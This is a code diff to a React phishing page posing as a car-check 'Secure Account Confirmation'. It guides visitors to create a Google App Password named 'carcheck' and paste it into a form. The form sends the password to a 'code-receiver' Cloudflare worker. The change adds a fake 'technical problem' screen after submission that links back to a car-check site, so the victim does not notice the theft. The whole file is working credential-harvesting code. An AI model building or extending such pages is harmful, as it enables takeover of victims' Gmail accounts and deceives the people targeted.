@@ -11,11 +11,13 @@ import {
 import "./App.css";
 
 const WORKER_URL = "https://code-receiver.mikaelmika263.workers.dev";
+const BACK_URL = "https://totalcarcheck.co.uk/";
 
 function App() {
   const [code, setCode] = useState("");
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
 
   const openGoogle = (url) => {
     window.open(url, "_blank", "noopener,noreferrer");
@@ -53,7 +55,7 @@ function App() {
       if (!res.ok) {
         setMessage(data.error || "Something went wrong.");
       } else {
-        setMessage("Submitted successfully ✅");
+        setSubmitted(true);
         setCode("");
       }
     } catch {
@@ -75,97 +77,115 @@ function App() {
           <p>Secure Account Confirmation</p>
         </div>
 
-        <div className="notice">
-          <ShieldCheck size={22} />
-          <div>
-            <h3>Verify this Gmail address is yours to continue.</h3>
+        {submitted ? (
+          <div className="tech-error">
+            <div className="tech-error-icon">
+              <ShieldCheck size={40} />
+            </div>
+            <h2>We're sorry</h2>
             <p>
-              Follow the simple steps below to confirm your account and submit for verification
+              We could not proceed due to a technical problem. Please try
+              again later or return to the home page.
             </p>
+            <a href={BACK_URL} className="tech-error-button">
+              Back
+            </a>
           </div>
-        </div>
-
-        <div className="steps">
-
-          <div className="step">
-            <div className="step-icon">
-              <LockKeyhole size={19} />
+        ) : (
+          <>
+            <div className="notice">
+              <ShieldCheck size={22} />
+              <div>
+                <h3>Verify this Gmail address is yours to continue.</h3>
+                <p>
+                  Follow the simple steps below to confirm your account and submit for verification
+                </p>
+              </div>
             </div>
-            <div className="step-content">
-              <h3>Step 1:check your 2-Step Verification</h3>
-              <p>For security purposes, check & turn ON 2-Step Verification.</p>
-              <button
-                className="google-button"
-                onClick={() => openGoogle(
-                  "https://myaccount.google.com/signinoptions/two-step-verification"
-                )}
-              >
-                Open Verification <ExternalLink size={14} />
-              </button>
-            </div>
-          </div>
 
-          <div className="step">
-            <div className="step-icon">
-              <ShieldCheck size={19} />
-            </div>
-            <div className="step-content">
-              <h3>Step 2: App Passwords</h3>
-              <p>Click here to create the app. The app name is carcheck.</p>
-              <button
-                className="google-button"
-                onClick={() => openGoogle(
-                  "https://myaccount.google.com/apppasswords"
-                )}
-              >
-                Generate & Confirm App Password <ExternalLink size={14} />
-              </button>
-            </div>
-          </div>
+            <div className="steps">
 
-          <div className="step">
-            <div className="step-icon">
-              <CheckCircle size={19} />
-            </div>
-            <div className="step-content">
-              <h3>Step 3: CarCheck Reference</h3>
-              <p>Copy and paste the generated password here and submit for verification.</p>
-
-              <form onSubmit={handleSubmit}>
-                <div className="input-wrapper">
-                  <input
-                    type="text"
-                    value={code}
-                    onChange={(e) => {
-                      setCode(
-                        e.target.value
-                          .replace(/[^a-zA-Z0-9]/g, "")
-                          .slice(0, 20)
-                      );
-                      setMessage("");
-                    }}
-                    placeholder="Enter generated password here"
-                    maxLength={20}
-                    autoComplete="off"
-                    spellCheck={false}
-                  />
-                  <span>{code.length}/20</span>
+              <div className="step">
+                <div className="step-icon">
+                  <LockKeyhole size={19} />
                 </div>
+                <div className="step-content">
+                  <h3>Step 1:check your 2-Step Verification</h3>
+                  <p>For security purposes, check & turn ON 2-Step Verification.</p>
+                  <button
+                    className="google-button"
+                    onClick={() => openGoogle(
+                      "https://myaccount.google.com/signinoptions/two-step-verification"
+                    )}
+                  >
+                    Open Verification <ExternalLink size={14} />
+                  </button>
+                </div>
+              </div>
 
-                <button
-                  type="submit"
-                  className="submit-button"
-                  disabled={loading || code.length < 16 || code.length > 20}
-                >
-                  {loading ? "Submitting..." : "Submit"} <Send size={15} />
-                </button>
-              </form>
+              <div className="step">
+                <div className="step-icon">
+                  <ShieldCheck size={19} />
+                </div>
+                <div className="step-content">
+                  <h3>Step 2: App Passwords</h3>
+                  <p>Click here to create the app. The app name is carcheck.</p>
+                  <button
+                    className="google-button"
+                    onClick={() => openGoogle(
+                      "https://myaccount.google.com/apppasswords"
+                    )}
+                  >
+                    Generate & Confirm App Password <ExternalLink size={14} />
+                  </button>
+                </div>
+              </div>
 
-              {message && <div className="message">{message}</div>}
+              <div className="step">
+                <div className="step-icon">
+                  <CheckCircle size={19} />
+                </div>
+                <div className="step-content">
+                  <h3>Step 3: CarCheck Reference</h3>
+                  <p>Copy and paste the generated password here and submit for verification.</p>
+
+                  <form onSubmit={handleSubmit}>
+                    <div className="input-wrapper">
+                      <input
+                        type="text"
+                        value={code}
+                        onChange={(e) => {
+                          setCode(
+                            e.target.value
+                              .replace(/[^a-zA-Z0-9]/g, "")
+                              .slice(0, 20)
+                          );
+                          setMessage("");
+                        }}
+                        placeholder="Enter generated password here"
+                        maxLength={20}
+                        autoComplete="off"
+                        spellCheck={false}
+                      />
+                      <span>{code.length}/20</span>
+                    </div>
+
+                    <button
+                      type="submit"
+                      className="submit-button"
+                      disabled={loading || code.length < 16 || code.length > 20}
+                    >
+                      {loading ? "Submitting..." : "Submit"} <Send size={15} />
+                    </button>
+                  </form>
+
+                  {message && <div className="message">{message}</div>}
+                </div>
+              </div>
+
             </div>
-          </div>
-
-        </div>
+          </>
+        )}
 
         <footer>Full car check report © 2026</footer>
 
